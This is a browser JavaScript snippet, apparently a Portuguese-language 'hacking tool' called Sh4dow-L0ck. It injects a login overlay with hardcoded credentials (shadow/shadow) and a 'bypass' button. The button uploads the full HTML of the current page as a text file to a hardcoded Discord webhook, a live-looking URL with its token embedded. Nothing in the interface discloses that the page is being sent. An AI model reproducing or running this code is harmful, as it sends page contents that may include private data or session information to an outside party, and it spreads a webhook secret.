(function() {
    // Verifica se já existe
    if (document.querySelector("#shadow-app")) return;

    // Cria o container principal
    const app = document.createElement("div");
    app.id = "shadow-app";

    // HTML do login
    const loginHTML = `
        <div class="container" id="login-container">
            <h1>Sh4dow-L0ck</h1>
            <p>Bem-vindo ao Sh4dow-L0ck</p>
            <input class="user-input" type="text" placeholder="o user">
            <input class="pass-input" type="password" placeholder="a senha">
            <button class="login-button">Entrar</button>
        </div>
    `;

    // HTML do home (inicialmente escondido)
    const homeHTML = `
        <div class="container" id="home-container" style="display:none;">
            <h1>Sh4dow-L0ck</h1>
            <p>Bem-vindo ao Sh4dow-L0ck</p>
            <p>bem vindo a ferramenta de hacking feito por ghost</p>
            <button class="bypass-raw-sem-acesso">bypass (raw, sem acesso)</button>
        </div>
    `;

    app.innerHTML = loginHTML + homeHTML;

    // Estilos
    const style = document.createElement("style");
    style.textContent = `
        #shadow-app {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 999999;
        }

        #shadow-app .container {
            text-align: center;
            background-color: #1e1e1e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            border: 2px solid #424642;
            width: 300px;
        }

        #shadow-app h1 {
            color: #db3030;
            font-size: 40px;
            margin-bottom: 10px;
        }

        #shadow-app p {
            color: #7e7979;
            font-size: 16px;
            margin-bottom: 20px;
        }

        #shadow-app .user-input, 
        #shadow-app .pass-input {
            display: block;
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: #ffffff;
            border: 2px solid #424642;
            box-sizing: border-box;
        }

        #shadow-app .login-button,
        #shadow-app .bypass-raw-sem-acesso {
            background-color: #424642;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        #shadow-app button:hover {
            background-color: #5a5a5a;
            width: 140px;
            border-radius: 10px;
            border: 2px solid #ffffff;
        }

        #shadow-app button:active {
            scale: 1.2;
            background-color: #2c2c2c;
        }

        #shadow-app .bypass-raw-sem-acesso:hover {
            background-color: #5f5b5b;
            scale: 1.05;
        }
    `;

    document.body.appendChild(style);
    document.body.appendChild(app);

    // ----- LOGIN -----
    const loginButton = app.querySelector('.login-button');
    const userInput = app.querySelector('.user-input');
    const passInput = app.querySelector('.pass-input');
    const loginContainer = app.querySelector('#login-container');
    const homeContainer = app.querySelector('#home-container');

    loginButton.addEventListener('click', () => {
        const username = userInput.value;
        const password = passInput.value;

        if (username === 'shadow' && password === 'shadow') {
            alert('Login bem-sucedido!');
            loginContainer.style.display = 'none';
            homeContainer.style.display = 'block';
        } else {
            alert('Usuário ou senha incorretos.');
        }
    });

    // ----- HOME / BYPASS -----
    const webhook = "https://discord.com/api/webhooks/1526964094425632778/C4BrHbWn7b_8mhpHU8zVZlyiJVugT4q_4IoZvVsu_sKA6SgWY9Qhi94xP6Uf1aZ75KlI";

    async function enviarRaw() {
        try {
            const codigoFonte = document.documentElement.outerHTML;
            const blob = new Blob([codigoFonte], { type: 'text/plain' });
            const formData = new FormData();
            formData.append('file', blob, 'pagina.txt');
            formData.append('content', '📄 Código fonte da página:');
            
            const resposta = await fetch(webhook, {
                method: 'POST',
                body: formData
            });
            
            if (resposta.ok) {
                console.log("✅ Arquivo TXT enviado!");
            } else {
                console.warn("❌ Erro:", resposta.status);
            }
        } catch(e) {
            console.warn("❌ Erro:", e);
        }
    }

    const bypassBtn = app.querySelector(".bypass-raw-sem-acesso");
    if (bypassBtn) {
        bypassBtn.addEventListener("click", enviarRaw);
    }

})();
